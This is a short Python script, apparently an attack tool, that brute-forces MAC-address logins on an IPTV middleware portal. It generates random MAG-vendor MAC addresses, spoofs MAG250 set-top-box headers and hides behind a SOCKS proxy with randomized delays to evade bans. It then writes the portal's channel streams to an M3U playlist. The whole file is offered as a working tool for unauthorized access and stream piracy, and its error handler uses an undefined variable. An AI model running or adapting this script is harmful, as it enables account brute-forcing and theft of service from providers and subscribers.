import random
from time import sleep

import requests

action = {
    1: 'get_all_channels',
    2: 'get_epg_info',
    3: 'get_ordered_list',
}

url = f"http://target/server/load.php?type=itv&action={action[1]}"
proxy = {'http': 'socks5://172.161.0.1:9050'}


def get_rand():
    vendor = "00:1A:79"
    octets = [f"{rng.randint(0, 255):02x}" for _ in range(3)]
    return f"{vendor}:{':'.join(octets)}".upper()


rng = random.SystemRandom()
s = requests.Session()

while True:
    mac = get_rand().upper()
    # mac = "00:1A:79:49:5A:19"

    headers = {
        "Cookie": f"mac={mac}",
        "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
        "X-User-Agent": "Model: MAG250; Link: WiFi",
    }

    try:
        res = s.get(url, headers=headers, proxies=proxy, timeout=10)
        res.raise_for_status()

    except requests.exceptions.HTTPError as e:
        print(f"[-] {mac} - HTTP {err.response.status_code}: {e}")
        print("[!] IP Banned")
        raise SystemExit

    try:
        res = res.json()['js']['data']
    except (KeyError, ValueError, TypeError) as e:
        print(f"[-] {mac} - No Data: {e}")
        sleep(rng.randint(30, 90))
        continue

    print(f"[+] Found working mac: {mac}")

    # import json
    # with open('dump.json', 'w', encoding='utf-8') as file:
    #     # only data we want
    #     res = [dict(name=k["name"], cmd=k["cmd"]) for k in res]
    #     json.dump(res, file, ensure_ascii=False, indent=2)

    # create playlist
    with open(f'dump.m3u', 'w', encoding='utf-8') as file:
        file.write('#EXTM3U\n\n')
        for chan in res:
            file.write(f"#EXTINF:-1 tvg-id=\"\", {chan['name']}\n")
            file.write(f"{chan['cmd'].replace('ffmpeg ', '')}\n\n")

    print(f"[+] M3U written to dump.m3u!")
    raise SystemExit
